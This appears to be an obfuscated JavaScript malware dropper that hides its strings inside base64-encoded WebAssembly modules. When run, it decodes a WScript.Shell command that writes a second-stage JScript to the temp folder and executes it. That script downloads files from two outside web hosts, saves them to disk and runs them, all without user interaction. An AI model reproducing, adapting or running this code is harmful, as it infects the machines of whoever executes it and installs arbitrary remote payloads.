const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGlYCAgAAEfwBBAQt/AEEIC38AQTILfwBBOAsHqoCAgAAFBm1lbW9yeQIABWRhdGEwAwAFZGF0YTEDAQVkYXRhMgMCBWRhdGEzAwMLpJaAgAAEAEEBCwVldmFsAABBCAspbmV3JTIwQWN0aXZlWE9iamVjdCglMjJXU2NyaXB0LlNoZWxsJTIyKQAAQTILBFJ1bgAAQTgL3BVDTUQlMjAlMjAlMjAlMjAlMkZjJTIwZWNobyUyMGV2YWwodW5lc2NhcGUoV1NjcmlwdC5Bcmd1bWVudHMoMCkpKSUyMCUzRSUyMCUyNVRFTVAlMjUlNUM3Njc4Mjc4NS5UWFQlMjAlMjYlMjYlMjB0aW1lb3V0JTIwMyUyMCUyNiUyNiUyMHdzY3JpcHQlMjAlMkZFJTNBSlNjcmlwdCUyMCUyNVRFTVAlMjUlNUM3Njc4Mjc4NS5UWFQlMjAlMjIlMjUyOGZ1bmN0aW9uJTI1MjglMjUyOSUyNTdCJTI1M0JmeVdnJTI1M0QlMjUyMCUyNTI4MzU3NyUyNTJDJTI1MjJ0eSUyNTIyJTJCJTI1MjJwZSUyNTIyJTI1MjklMjUzQmpZT0RoJTI1M0QlMjUyMCUyNTI4MjM3MTYlMjUyQyUyNTIyJTI1NUMlMjU1QyUyNTIyJTJCJTI1MjJ0bXA4NDkwOTQuNTA5JTI1MjIlMjUyOSUyNTNCQ3FQcFNYJTI1M0QlMjUyMCUyNTI4MzQzOSUyNTJDJTI1MjJodCUyNTIyJTJCJTI1MjJ0cCUyNTNBJTJGJTJGd3d3Lm5lbWNpY2VuYWRoYW5vdS5jeiUyRm52ZHRpbWUucHJzJTI1MjIlMjUyOSUyNTNCbHZEbSUyNTNEJTI1MjAlMjUyODUxNzk5JTI1MkMlMjUyMmh0JTI1MjIlMkIlMjUyMnRwJTI1M0ElMkYlMkZob3Jjb3IuY29tJTJGZXNlLnRmJTI1MjIlMjUyOSUyNTNCdm5hUW1tJTI1M0QlMjUyMCUyNTI4MzM0MjglMjUyQyUyNTIybmUlMjUyMiUyQiUyNTIydyUyNTIwQWN0aXZlWE9iamVjdCUyNTI4JTI1NUMlMjUyMkFET0RCLlN0cmVhbSUyNTVDJTI1MjIlMjUyOSUyNTIyJTI1MjklMjUzQk5kVnklMjUzRCUyNTIwJTI1Mjg3NjQ2NiUyNTJDJTI1MjJXciUyNTIyJTJCJTI1MjJpdGUlMjUyMiUyNTI5JTI1M0JQdnN4JTI1M0QlMjUyMCUyNTI4NjkxNDIlMjUyQyUyNTIyRXglMjUyMiUyQiUyNTIycGFuZEVudmlyb25tZW50U3RyaW5ncyUyNTIyJTI1MjklMjUzQlhueWQlMjUzRCUyNTIwJTI1MjgzNTk4MSUyNTJDJTI1MjJFeCUyNTIyJTJCJTI1MjJlYyUyNTIyJTI1MjklMjUzQnJoelVVQkclMjUzRCUyNTIwJTI1Mjg1OTExMiUyNTJDJTI1MjJvcCUyNTIyJTJCJTI1MjJlbiUyNTIyJTI1MjklMjUzQnFKZGZWJTI1M0QlMjUyMCUyNTI4NDM0MjklMjUyQyUyNTIycmUlMjUyMiUyQiUyNTIyc3BvbnNlQm9keSUyNTIyJTI1MjklMjUzQmlLUEMlMjUzRCUyNTIwJTI1Mjg3MjE1NSUyNTJDJTI1MjJuZSUyNTIyJTJCJTI1MjJ3JTI1MjBBY3RpdmVYT2JqZWN0JTI1MjglMjU1QyUyNTIyV1NjcmlwdC5TaGVsbCUyNTVDJTI1MjIlMjUyOSUyNTIyJTI1MjklMjUzQmRrYWklMjUzRCUyNTIwJTI1MjgzODg3NCUyNTJDJTI1MjIlMjUyNVQlMjUyMiUyQiUyNTIyRU1QJTI1MjUlMjUyMiUyNTI5JTI1M0JyRHBhJTI1M0QlMjUyMCUyNTI4NTQ1ODIlMjUyQyUyNTIyc2ElMjUyMiUyQiUyNTIydmVUb0ZpbGUlMjUyMiUyNTI5JTI1M0JUeVJxSFMlMjUzRCUyNTIwJTI1Mjg0MDM4MSUyNTJDJTI1MjJuZSUyNTIyJTJCJTI1MjJ3JTI1MjBBY3RpdmVYT2JqZWN0JTI1MjglMjU1QyUyNTIyTXN4bWwyLlNlcnZlclhNTEhUVFAlMjU1QyUyNTIyJTI1MjklMjUyMiUyNTI5JTI1M0JGYVFpdnFRViUyNTNEJTI1MjAlMjUyODcwNTUzJTI1MkMlMjUyMmV2JTI1MjIlMkIlMjUyMmFsJTI1MjIlMjUyOSUyNTNCU3F1S0glMjUzRCUyNTIwJTI1MjgxMzk3NyUyNTJDJTI1MjJzZSUyNTIyJTJCJTI1MjJuZCUyNTIyJTI1MjklMjUzQkNYRkNYZyUyNTNEJTI1MjAlMjUyODIyNzE1JTI1MkMlMjUyMkdFJTI1MjIlMkIlMjUyMlQlMjUyMiUyNTI5JTI1M0JVaW9FeHdmJTI1M0QlMjUyMCUyNTI4OTEwMzIlMjUyQ3RoaXMlMjU1QkZhUWl2cVFWJTI1NUQlMjUyOGlLUEMlMjUyOSUyNTI5JTI1M0JzZEN5TSUyNTNEJTI1MjAlMjUyODIxMzM0JTI1MkN0aGlzJTI1NUJGYVFpdnFRViUyNTVEJTI1Mjh2bmFRbW0lMjUyOSUyNTI5JTI1M0JNUHN4YU4lMjUzRCUyNTIwJTI1MjgyNzc4MyUyNTJDdGhpcyUyNTVCRmFRaXZxUVYlMjU1RCUyNTI4VHlScUhTJTI1MjklMjUyOSUyNTNCdmJpTmElMjUzRCUyNTIwJTI1Mjg4NjQxNCUyNTJDVWlvRXh3ZiUyNTVCUHZzeCUyNTVEJTI1Mjhka2FpJTI1MjklMkJqWU9EaCUyNTI5JTI1M0JzZEN5TSUyNTVCZnlXZyUyNTVEJTI1M0QlMjUyMCUyNTI4ODM4OTAlMjUyQzElMjUyOSUyNTNCc2RDeU0lMjU1QnJoelVVQkclMjU1RCUyNTI4JTI1MjklMjUzQlNDRmklMjUzRCUyNTIwJTI1Mjg4OTUwMyUyNTJDbnVsbCUyNTI5JTI1M0J0cnklMjU3Qk1Qc3hhTiUyNTVCcmh6VVVCRyUyNTVEJTI1MjhDWEZDWGclMjUyQ2x2RG0lMjUyQ2ZhbHNlJTI1MjklMjUzQk1Qc3hhTiUyNTVCU3F1S0glMjU1RCUyNTI4JTI1MjklMjUzQlNDRmklMjUzRCUyNTIwJTI1MjgxMDE5NCUyNTJDTVBzeGFOJTI1NUJxSmRmViUyNTVEJTI1MjklMjUzQnNkQ3lNJTI1NUJOZFZ5JTI1NUQlMjUyOFNDRmklMjUyOSUyNTNCJTI1N0RjYXRjaCUyNTI4dkJFQiUyNTI5JTI1N0IlMjU3RGlmJTI1MjhudWxsJTI1M0QlMjUzRFNDRmklMjUyOSUyNTdCdHJ5JTI1N0JNUHN4YU4lMjU1QnJoelVVQkclMjU1RCUyNTI4Q1hGQ1hnJTI1MkNDcVBwU1glMjUyQ2ZhbHNlJTI1MjklMjUzQk1Qc3hhTiUyNTVCU3F1S0glMjU1RCUyNTI4JTI1MjklMjUzQlNDRmklMjUzRCUyNTIwJTI1Mjg1ODg2NSUyNTJDTVBzeGFOJTI1NUJxSmRmViUyNTVEJTI1MjklMjUzQnNkQ3lNJTI1NUJOZFZ5JTI1NUQlMjUyOFNDRmklMjUyOSUyNTNCJTI1N0RjYXRjaCUyNTI4RE5aY052USUyNTI5JTI1N0IlMjU3RCUyNTdEc2RDeU0lMjU1QnJEcGElMjU1RCUyNTI4dmJpTmElMjUyQzIlMjUyOSUyNTNCVWlvRXh3ZiUyNTVCWG55ZCUyNTVEJTI1Mjh2YmlOYSUyNTI5JTI1M0IlMjU3RCUyNTI5JTI1MjglMjUyOSUyNTNCJTIyAA=='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
(() => {
    const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
        env: {
            impFunc: () => {
                this[lS(0, 0)](lS(0, 1))[lS(0, 2)](lS(0, 3), 0);
            }
        }
    });
    const __exports = __callInstance0.exports;
    return __exports.data();
})();